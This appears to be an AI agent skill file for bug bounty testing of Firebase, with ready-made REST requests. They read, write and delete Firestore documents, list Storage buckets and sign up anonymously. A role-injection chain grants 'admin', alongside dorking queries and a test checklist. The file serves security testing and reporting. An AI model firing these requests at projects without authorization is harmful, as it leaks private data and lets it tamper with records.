---
name: firebase-misconfig
description: "Test Firebase for world-readable or writable Firestore rules, listable Storage buckets, anonymous auth signup, role-injection privilege escalation, and exposed Cloud Functions. Use when JS bundles, mobile apps, or config files reveal firebaseio.com / firebaseapp.com endpoints or a Firebase API key."
---

# Firebase Misconfiguration Patterns

## Crown Jewel Targets

- **Open Firestore collections** — unauthenticated read of `users`, `orders`, `admin` collections containing PII and financial data
- **Privilege escalation via role injection** — PATCH user profile to add `admin` role when Firestore rules check auth but not authorization
- **Storage bucket listing** — enumerate all objects in Firebase Storage exposing private files (images, documents, exports)
- **Anonymous auth + open rules** — combine anonymous token with overly permissive Firestore rules for full CRUD access
- **Cloud Functions without auth** — `allUsers` invoker permission on serverless functions exposing internal logic
- **Metadata injection bypass** — override `resource.metadata.userId` during upload to bypass storage delete rules

## Attack Surface Signals

- `*.firebaseio.com`, `*.firebaseapp.com`, `firebasestorage.app` in network traffic
- Firebase config object in JS: `projectId`, `apiKey`, `databaseURL`, `storageBucket`, `authDomain`
- Google Identity Toolkit API calls (`identitytoolkit.googleapis.com`)
- `firestore.googleapis.com` REST API calls in browser DevTools
- Mobile app with Firebase SDK (decompile APK for config)
- `LSKey-c$CookieConsentPolicy` cookie (Salesforce indicator, NOT Firebase — don't confuse)

## Detection

### Identify Firebase Targets
1. **Network traffic**: Monitor for `*.firebaseio.com`, `*.firebaseapp.com`, `firebasestorage.app`
2. **JS config objects**: Search source/bundles for `projectId`, `databaseURL`, `storageBucket`, `apiKey`, `authDomain`
3. **Google dorking**:
   ```
   site:.firebaseio.com "<target>"
   (site:.firebasestorage.app OR site:.appspot.com) "<target>"
   ```
4. **GitHub dorking**: Search for leaked Firebase configs with project identifiers

### Extract Project Info
From JS config object, note:
- `projectId` - needed for all API calls
- `apiKey` - needed for auth
- `databaseURL` - `https://<project>.firebaseio.com`
- `storageBucket` - `<project>.firebasestorage.app`

---

## Firestore Rules Misconfigurations

Firebase uses **deny-by-default** rules. Test both **unauthenticated** and **authenticated** access.

### Read Access (Data Leak)

**Test endpoint:**
```
GET https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<COLLECTION>
```

Common collections to enumerate: `users`, `admin`, `products`, `messages`, `orders`, `contact-form-data`, `config`, `settings`, `logs`

**Vulnerable rule example:**
```javascript
match /contact-form-data/{document} {
  allow read, write, create, delete: if true;
}
```

### Write/Create Access (Data Manipulation)

**Create document:**
```http
POST /v1/projects/<PROJECT_ID>/databases/(default)/documents/<COLLECTION> HTTP/2
Host: firestore.googleapis.com
Content-Type: application/json
Authorization: Bearer <ID_TOKEN>

{
  "fields": {
    "name": {"stringValue": "test"},
    "price": {"doubleValue": 0.01},
    "isActive": {"booleanValue": true}
  }
}
```

**Update document:**
```http
PATCH /v1/projects/<PROJECT_ID>/databases/(default)/documents/<COLLECTION>/<DOC_ID> HTTP/2
Host: firestore.googleapis.com
Content-Type: application/json
Authorization: Bearer <ID_TOKEN>

{
  "fields": {
    "role": {"stringValue": "admin"}
  }
}
```

### Privilege Escalation Chain

**Pattern**: Auth-only check (no authorization) + user-controlled role field = privesc

1. Register account via Firebase Auth
2. PATCH your user profile to add admin role:
   ```json
   {"fields": {"roles": {"arrayValue": {"values": [{"stringValue": "admin"}]}}}}
   ```
3. Access admin-only collections with elevated token
4. Create/modify admin resources (discount codes, products, etc.)

**Vulnerable rule (auth without authz):**
```javascript
match /admin-mgmt/products/{product} {
  allow create: if request.auth != null;  // Any authenticated user!
}
match /users/profile/{userId} {
  allow write: if request.auth.uid == userId;  // No field validation!
}
```

### Delete Access

**Test:**
```http
DELETE /v1/projects/<PROJECT_ID>/databases/(default)/documents/<COLLECTION>/<DOC_ID> HTTP/2
Host: firestore.googleapis.com
Authorization: Bearer <ID_TOKEN>
```

---

## Firebase Storage Misconfigurations

### Open Bucket Read
```
GET https://firebasestorage.googleapis.com/v0/b/<BUCKET>/o
```
Lists all objects. Real case: Tea dating app - 72,000 private images stolen.

### Open Bucket Write
Upload arbitrary files to storage bucket.

### CORS Misconfiguration
**Vulnerable CORS policy:**
```json
[{"origin": ["*"], "method": ["GET", "POST", "DELETE"], "maxAgeSeconds": 3600}]
```
Allows any origin to read/write/delete storage objects cross-origin.

### Metadata Injection
Storage rules using `resource.metadata` for authz can be bypassed:
```javascript
// Vulnerable: trusts user-supplied metadata
allow delete: if resource.metadata.userId == request.auth.uid;
```
Attacker sets `metadata.userId` during upload to match their UID, then can delete.

---

## Firebase Auth Bypass

### Anonymous Auth
If anonymous auth is enabled, get a token without credentials:
```http
POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>
Content-Type: application/json

{"returnSecureToken": true}
```

### Email/Password Signup
Register new account if signup is open:
```http
POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>
Content-Type: application/json

{"email": "attacker@test.com", "password": "password123", "returnSecureToken": true}
```

### Get ID Token (for authenticated requests)
```http
POST https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>
Content-Type: application/json

{"email": "attacker@test.com", "password": "password123", "returnSecureToken": true}
```
Response contains `idToken` - use as `Authorization: Bearer <idToken>`.

---

## Cloud Functions

### Enumerate Functions
Check for common function names at:
```
https://<REGION>-<PROJECT_ID>.cloudfunctions.net/<FUNCTION_NAME>
```
Common regions: `us-central1`, `europe-west1`, `asia-east1`

### Unauthenticated Function Invocation
Functions with `allUsers` invoker permission respond without auth. Test with OPTIONS/GET/POST.

---

## Tools

| Tool | Purpose |
|------|---------|
| **FirebaseEnum** | Enumerate Firebase project misconfigs |
| **Baserunner** | Firebase security assessment tool |
| **Burp Suite** | Intercept/replay Firebase REST API calls |
| **firebase-exploit** | Automated Firebase misconfiguration testing |

### Manual Workflow
1. Extract Firebase config from JS
2. Test anonymous/signup auth
3. Enumerate collections via Firestore REST API (both unauth + auth)
4. Test CRUD on each collection
5. Check Storage bucket listing + CORS
6. Look for Cloud Functions endpoints

---

## Bug Bounty Impact Classification

| Finding | Severity |
|---------|----------|
| Open Firestore read (PII/sensitive data) | High-Critical |
| Open Firestore write (admin collections) | High-Critical |
| Privilege escalation via role injection | High-Critical |
| Storage bucket listing (private files) | Medium-High |
| Storage CORS wildcard origin | Medium |
| Anonymous auth enabled (alone) | Informational |
| Firebase API key exposed (alone) | Informational (public by design) |

**Key insight**: Firebase API keys are **public by design** - they are NOT secrets. The real vulnerabilities are in Firestore/Storage security rules. Don't report API key exposure alone.

---

## Quick Test Checklist

```
[ ] Extract projectId, apiKey, storageBucket from JS
[ ] Test anonymous signup: POST identitytoolkit.googleapis.com/v1/accounts:signUp
[ ] Test Firestore read (unauth): GET firestore.googleapis.com/.../documents/<collection>
[ ] Test Firestore read (auth): Same with Bearer token
[ ] Enumerate common collections: users, admin, config, orders, messages, logs
[ ] Test write/create on each collection (auth + unauth)
[ ] Test delete on each collection
[ ] Test Storage listing: GET firebasestorage.googleapis.com/v0/b/<bucket>/o
[ ] Check for user-controlled fields used in security rules (role injection)
[ ] Test metadata injection on Storage uploads
[ ] Check CORS on Storage bucket
```

---

## Operator Notes (Battle-Tested)

- **Firebase API keys are PUBLIC by design** — NEVER report API key exposure alone. The real vulnerabilities are in Firestore/Storage security rules
- **Anonymous auth + open rules is the kill combo** — register anonymous account (`accounts:signUp` with `returnSecureToken:true`), then test Firestore collections with the token
- **Enumerate common collection names aggressively** — `users`, `admin`, `config`, `orders`, `messages`, `logs`, `products`, `settings`, `contact-form-data` are the most common
- **PATCH role injection is high-value** — if user profile allows `write` and rule only checks `auth != null` (not field-level), add `admin` role to your profile
- **Storage CORS wildcard + private files = reportable** — wildcard origin `*` on storage with private files allows any site to read them cross-origin
- **exiftool on generated PDFs/exports** — if Firebase Storage serves generated content, metadata may leak internal project structure
- **Mobile apps are the easiest Firebase discovery vector** — decompile APK with jadx, search for `google-services.json` or Firebase config

## Related Skills & Chains

| Situation | Pattern / Skill |
|-----------|----------------|
| Access control testing on Firestore | `access-control-testing` |
| API methodology for REST endpoints | `api-security-testing` |
| Mobile app Firebase config extraction | `mobile-api-testing` |
| JS bundle leaking Firebase config | `js-bundle-secrets` |
| CORS on Firebase Storage | `cors-testing` |
| Finding chain escalation | `auto-chain-discovery` |
